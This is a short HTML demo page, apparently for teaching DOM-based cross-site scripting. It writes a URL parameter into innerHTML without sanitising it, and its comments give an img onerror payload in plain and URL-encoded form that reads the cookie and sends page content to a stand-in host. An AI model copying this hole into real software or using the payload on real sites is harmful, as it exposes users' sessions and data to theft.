<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealing-critical Example</title>
</head>
<body>

<!-- Vulnerable Code -->
<div>
    Welcome, <span id="username"></span>!
 </div>

<script>
    // Function to set a cookie, mostly this will be set from server
    function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
    setCookie("exampleCookie", "Hello, Cookie!", 7);
</script>

<!-- Vulnerable Code -->
<script>
    //hijack exampl
    // <img src="empty.gif" onerror="var myCookie=document.cookie; new Image().src=`https://example.com/fakepage.php?output=${document.body.innerHTML}`;"/> 
    // ?name=%3Cimg%20src%3D%22empty.gif%22%20onerror%3D%22var%20myCookie%3Ddocument.cookie%3B%20new%20Image().src%3D%60https%3A%2F%2Fexample.com%2Ffakepage.php%3Foutput%3D%24%7Bdocument.body.innerHTML%7D%60%3B%22%2F%3E
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    document.getElementById('username').innerHTML = name;
 </script>

</body>
</html>